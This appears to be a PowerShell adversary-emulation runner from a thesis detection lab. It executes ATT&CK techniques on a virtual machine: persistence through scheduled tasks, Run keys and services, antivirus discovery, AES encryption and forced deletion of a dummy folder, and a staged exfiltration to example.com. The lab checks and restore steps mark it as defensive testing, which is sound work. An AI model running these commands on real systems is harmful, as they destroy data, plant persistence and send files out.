#Requires -RunAsAdministrator
<#
Candidate runner v2 for P4/P3 clean iteration.

Changes:
- Uses candidate TEC-007 scripts with aligned CSV/list paths.
- Validates that .aes files exist before restoring TEC-007.
- Uses candidate TEC-009 script to include Compress-Archive + Copy-Item + TcpClient.
- Does not modify original runner or original technique scripts.
- Cleanup/restoration events are logged but must not be counted as primary detection.
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

$BasePath = "C:\Users\seguridad\Desktop\TFM\Pruebas"
$DumbLab = Join-Path $BasePath "DUMB_LAB"

$CandidateRoot = "C:\Users\seguridad\Desktop\TFM"
$ScriptsCandidate = Join-Path $CandidateRoot "scripts_candidate"

$RansomDir = Join-Path $BasePath "TEC-007_Ransomware"
$SabotageDir = Join-Path $BasePath "TEC-008_Sabotaje"
$ExfilDir = Join-Path $BasePath "TEC-009_Exfiltracion"

$EnumScript = Join-Path $ScriptsCandidate "enumeracion_v2.ps1"
$RansomScript = Join-Path $ScriptsCandidate "Scriptransom_v2.ps1"
$ExfilScript = Join-Path $ScriptsCandidate "exfiltracion_v2.ps1"

$RestoreRansom = Join-Path $RansomDir "crear_directorio_dummy.ps1"
$RestoreSab = Join-Path $SabotageDir "crear_directorio_dummy.ps1"
$RestoreExfil = Join-Path $ExfilDir "crear_directorio_dummy.ps1"

$LogDir = Join-Path $BasePath "Logs_Pruebas_TFM"
New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
$LogFile = Join-Path $LogDir ("TFM_TEC_Run_CANDIDATE_v2_{0}.log" -f (Get-Date -Format "yyyyMMdd_HHmmss"))

$PauseBetweenTestsSeconds = 10
$ShortPauseSeconds = 2

function Write-Step {
    param([AllowEmptyString()][string]$Message = "", [string]$Level = "INFO")
    if ([string]::IsNullOrWhiteSpace($Message)) {
        Write-Host ""
        Add-Content -Path $LogFile -Value ""
        return
    }
    $line = "[{0}] [{1}] {2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Level, $Message
    Write-Host $line
    Add-Content -Path $LogFile -Value $line
}

function Invoke-CmdLine {
    param(
        [Parameter(Mandatory=$true)][string]$Command,
        [string]$Description = "",
        [switch]$IgnoreExitCode
    )
    if ($Description) { Write-Step $Description }
    Write-Step ("CMD => {0}" -f $Command)
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/d /c $Command"
        $psi.UseShellExecute = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.CreateNoWindow = $false
        $p = New-Object System.Diagnostics.Process
        $p.StartInfo = $psi
        [void]$p.Start()
        $stdout = $p.StandardOutput.ReadToEnd()
        $stderr = $p.StandardError.ReadToEnd()
        $p.WaitForExit()
        if ($stdout.Trim()) { Write-Step ("STDOUT => {0}" -f ($stdout.Trim() -replace "`r?`n"," | ")) }
        if ($stderr.Trim()) { Write-Step ("STDERR => {0}" -f ($stderr.Trim() -replace "`r?`n"," | ")) "WARN" }
        Write-Step ("ExitCode => {0}" -f $p.ExitCode)
        if (($p.ExitCode -ne 0) -and (-not $IgnoreExitCode)) {
            Write-Step ("Non-zero ExitCode: {0}" -f $p.ExitCode) "WARN"
        }
        return $p.ExitCode
    }
    catch {
        Write-Step ("ERROR executing command: {0}" -f $_.Exception.Message) "ERROR"
        return -9999
    }
}

function Invoke-PSFileIfExists {
    param([Parameter(Mandatory=$true)][string]$ScriptPath, [string]$Description = "", [string]$Arguments = "")
    if (Test-Path -LiteralPath $ScriptPath) {
        $cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{0}" {1}' -f $ScriptPath, $Arguments
        Invoke-CmdLine -Command $cmd -Description $Description | Out-Null
    }
    else {
        Write-Step ("Missing script: {0}" -f $ScriptPath) "ERROR"
    }
}

function Restore-DumbLab {
    param([Parameter(Mandatory=$true)][ValidateSet("Ransomware","Sabotaje","Exfiltracion","All")][string]$Mode)
    Write-Step "Restoring controlled dataset. Mode: $Mode"
    switch ($Mode) {
        "Ransomware" { Invoke-PSFileIfExists -ScriptPath $RestoreRansom -Description "Restore dataset from ransomware folder" }
        "Sabotaje" { Invoke-PSFileIfExists -ScriptPath $RestoreSab -Description "Restore dataset from sabotage folder" }
        "Exfiltracion" { Invoke-PSFileIfExists -ScriptPath $RestoreExfil -Description "Restore dataset from staging folder" }
        "All" {
            Invoke-PSFileIfExists -ScriptPath $RestoreRansom -Description "Restore dataset from ransomware folder"
            Invoke-PSFileIfExists -ScriptPath $RestoreSab -Description "Restore dataset from sabotage folder"
            Invoke-PSFileIfExists -ScriptPath $RestoreExfil -Description "Restore dataset from staging folder"
        }
    }
}

function Assert-DumbLabSafe {
    $Expected = "C:\Users\seguridad\Desktop\TFM\Pruebas\DUMB_LAB"
    if ($DumbLab -ne $Expected) { throw "Unsafe DUMB_LAB path. Aborted." }
    if (-not (Test-Path -LiteralPath $DumbLab)) { throw "DUMB_LAB does not exist. Aborted." }
}

function Start-Test { param([string]$Tec, [string]$Name) Write-Step ""; Write-Step "============================================================"; Write-Step "START $Tec - $Name"; Write-Step "============================================================" }
function End-Test { param([string]$Tec) Write-Step "END $Tec"; Write-Step "============================================================"; Start-Sleep -Seconds $PauseBetweenTestsSeconds }

Write-Step "Starting candidate campaign v2 P4/P3"
Write-Step "Log: $LogFile"

if (-not (Test-Path -LiteralPath $BasePath)) { throw "BasePath does not exist: $BasePath" }
if (-not (Test-Path -LiteralPath $ScriptsCandidate)) { Write-Step "scripts_candidate not found in VM path. Copy candidate scripts before running." "ERROR" }

Invoke-CmdLine -Command 'schtasks.exe /delete /tn "TFM-TEC-003" /f' -Description "Pre-clean scheduled task" -IgnoreExitCode | Out-Null
Invoke-CmdLine -Command 'sc.exe delete "TFM TEC005 Test Service"' -Description "Pre-clean service" -IgnoreExitCode | Out-Null
Invoke-CmdLine -Command 'reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f' -Description "Pre-clean RunKey" -IgnoreExitCode | Out-Null

Restore-DumbLab -Mode "All"

Start-Test -Tec "TEC-001" -Name "PowerShell / T1059.001"
Invoke-CmdLine -Command 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"' -Description "TEC-001 command" | Out-Null
End-Test -Tec "TEC-001"

Start-Test -Tec "TEC-002" -Name "Windows Command Shell / T1059.003"
Invoke-CmdLine -Command 'cmd.exe /c "echo TEC002_OK & powershell.exe -NoProfile -Command Get-Process"' -Description "TEC-002 command" | Out-Null
End-Test -Tec "TEC-002"

Start-Test -Tec "TEC-003" -Name "Scheduled Task / T1053.005"
$taskTime = (Get-Date).AddMinutes(5).ToString("HH:mm")
$tec003Create = 'schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st {0} /f' -f $taskTime
Invoke-CmdLine -Command $tec003Create -Description "Create scheduled task" | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Invoke-CmdLine -Command 'schtasks.exe /run /tn "TFM-TEC-003"' -Description "Run scheduled task" -IgnoreExitCode | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Invoke-CmdLine -Command 'schtasks.exe /delete /tn "TFM-TEC-003" /f' -Description "Delete scheduled task" -IgnoreExitCode | Out-Null
End-Test -Tec "TEC-003"

Start-Test -Tec "TEC-004" -Name "Registry Run Key / T1547.001"
Invoke-CmdLine -Command 'reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f' -Description "Create RunKey" | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Invoke-CmdLine -Command 'reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f' -Description "Delete RunKey" | Out-Null
End-Test -Tec "TEC-004"

Start-Test -Tec "TEC-005" -Name "Service Execution / T1569.002"
Invoke-CmdLine -Command 'sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand' -Description "Create service" | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Invoke-CmdLine -Command 'sc.exe start "TFM TEC005 Test Service"' -Description "Try service start" -IgnoreExitCode | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Invoke-CmdLine -Command 'sc.exe delete "TFM TEC005 Test Service"' -Description "Delete service" -IgnoreExitCode | Out-Null
End-Test -Tec "TEC-005"

Start-Test -Tec "TEC-006" -Name "Security Software Discovery / T1518.001"
Invoke-CmdLine -Command 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState"' -Description "PowerShell AV discovery" | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Invoke-CmdLine -Command 'cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"' -Description "WMIC AV discovery" | Out-Null
End-Test -Tec "TEC-006"

Start-Test -Tec "TEC-007" -Name "Data Encrypted for Impact / T1486"
Restore-DumbLab -Mode "Ransomware"
Assert-DumbLabSafe
Invoke-PSFileIfExists -ScriptPath $EnumScript -Description "Generate file list for controlled encryption" -Arguments ('-TargetPath "{0}" -OutputDir "{1}"' -f $DumbLab, $ScriptsCandidate)
Invoke-PSFileIfExists -ScriptPath $RansomScript -Description "Run controlled AES encryption" -Arguments ('-WorkDir "{0}" -ListFile "{1}" -PasswordFile "{2}" -MaxFiles 25' -f $ScriptsCandidate, (Join-Path $ScriptsCandidate "lista_archivos.csv"), (Join-Path $RansomDir "password.txt"))
$aesCount = @(Get-ChildItem -LiteralPath $DumbLab -Recurse -File -Filter "*.aes" -ErrorAction SilentlyContinue).Count
Write-Step ("TEC-007 validation .aes count before restore => {0}" -f $aesCount)
if ($aesCount -lt 1) { Write-Step "TEC-007 did not generate .aes files. Campaign not valid for CU-007." "ERROR" }
Start-Sleep -Seconds $ShortPauseSeconds
Restore-DumbLab -Mode "Ransomware"
End-Test -Tec "TEC-007"

Start-Test -Tec "TEC-008" -Name "Data Destruction / T1485"
Restore-DumbLab -Mode "Sabotaje"
Assert-DumbLabSafe
$tec008Command = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = ''{0}''; Write-Host ''TEC008_OK''; Get-ChildItem $target -Recurse -File | ForEach-Object {{ Remove-Item $_.FullName -Force }}; Start-Sleep 3"' -f $DumbLab
Invoke-CmdLine -Command $tec008Command -Description "Controlled destructive deletion" | Out-Null
Start-Sleep -Seconds $ShortPauseSeconds
Restore-DumbLab -Mode "Sabotaje"
End-Test -Tec "TEC-008"

Start-Test -Tec "TEC-009" -Name "Staging / Archive / Network Context"
Restore-DumbLab -Mode "Exfiltracion"
Assert-DumbLabSafe
Invoke-PSFileIfExists -ScriptPath $ExfilScript -Description "Controlled staging/archive plus network context" -Arguments ('-SourcePath "{0}" -StagingPath "{1}" -RemoteHost "example.com" -RemotePort 80 -HoldSeconds 20' -f $DumbLab, (Join-Path $ExfilDir "datos_robados"))
Start-Sleep -Seconds $ShortPauseSeconds
Restore-DumbLab -Mode "Exfiltracion"
End-Test -Tec "TEC-009"

Write-Step "Final dataset restore"
Restore-DumbLab -Mode "All"
Write-Step "Candidate campaign v2 finished"
Write-Step "Final log: $LogFile"
Write-Host "Candidate tests finished. Log: $LogFile"
